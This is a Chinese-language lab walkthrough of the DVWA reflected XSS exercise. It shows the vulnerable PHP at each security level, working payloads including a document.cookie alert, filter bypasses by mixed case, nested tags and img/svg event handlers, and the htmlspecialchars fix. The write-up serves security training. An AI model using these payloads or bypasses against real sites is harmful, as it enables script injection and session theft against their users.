靶场地址：`/vulnerabilities/xss_r/`

>
> 反射 XSS：用户输入的内容被服务器直接拼入响应 HTML 页面返回，不需要浏览器本地 JS 处理；恶意参数会随 HTTP 请求发送给服务器，服务器把 payload 回显到网页。
> 页面功能：输入名字，页面输出 `Hello 你输入的名字`。

## Low 级别

源码：

```
<?php
$name = $_GET['name'];
echo '<pre>Hello ' . $name . '</pre>';
?>
```

无任何过滤，直接 GET 参数`name`输出到页面。

✅Payload：

```
?vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
```

完整 URL：

```
https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```

浏览器访问，直接弹出弹窗。

其他可用 payload：

```
?name=<img src=x onerror=alert(1)>
?name=<svg onload=alert(1)>
```

## Medium 级别

源码：

```
$name = str_replace('<script>','',$_GET['name']);
echo '<pre>Hello '.$name.'</pre>';
```

>
> 只简单把`<script>`字符串替换为空，**大小写、嵌套标签可以绕过**。

### 绕过方式 1：大小写混淆

```
?name=<ScRiPt>alert(1)</ScRiPt>
```

`str_replace`只替换小写的`<script>`，大写不会被清除。

### 绕过方式 2：标签嵌套

```
?name=<scr<script>ipt>alert(1)</scr</script>ipt>
```

后端把中间的`<script>`删掉，剩下拼接得到完整的`<script>`标签。

### 绕过方式 3：不使用 script 标签，事件触发

```
?name=<img src=x onerror=alert(1)>
```

>
> 过滤只针对 script 标签，img、svg 不受影响。

## High 级别

源码：

```
$name = preg_replace('/<\s*script\s*>/i','', $_GET['name']);
```

正则表达式，不区分大小写，匹配`<script>`标签，尽可能清除 script 标签。
但是**只过滤 script 标签，其他 HTML 标签、事件处理器没有过滤**。

>
> ❌ `<script>`系列全部被干掉
> ✅ 依然可以使用 img、svg、body 等标签的 on 事件。

✅High 可用 payload：

```
?vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>
```

```
?vulnerabilities/xss_r/?name=<svg onload=alert(1)>
```

## Impossible 级别

源码使用`htmlspecialchars()`对输出做 HTML 实体转义：

```
$name = htmlspecialchars($_GET['name'], ENT_QUOTES);
echo '<pre>Hello '.$name.'</pre>';
```

`htmlspecialchars`把 `< > & " '`全部转义成 HTML 实体；输入全部作为纯文本渲染，**没有 XSS 漏洞，无法攻击**。